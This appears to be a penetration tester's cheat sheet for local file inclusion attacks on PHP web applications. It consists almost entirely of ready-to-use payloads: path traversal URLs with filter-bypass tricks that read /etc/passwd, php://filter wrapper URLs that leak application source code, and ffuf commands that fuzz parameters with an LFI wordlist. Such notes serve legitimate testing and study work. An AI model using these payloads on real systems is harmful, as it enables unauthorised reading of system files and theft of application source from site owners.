**List of payloads**
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File) Inclusion/README.md
**Non-recursive filter bypass**
```Python
http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd
```
**Mangle capitals & operators for filter bypasses**
```Python
http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd
```
**PHP Wrappers**
- Leak php instead of executing it.
```Python
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
**ffuf**
- Copy request to file via burp
```Python
ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```
**Filter by wordcount**
```Python
ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
```
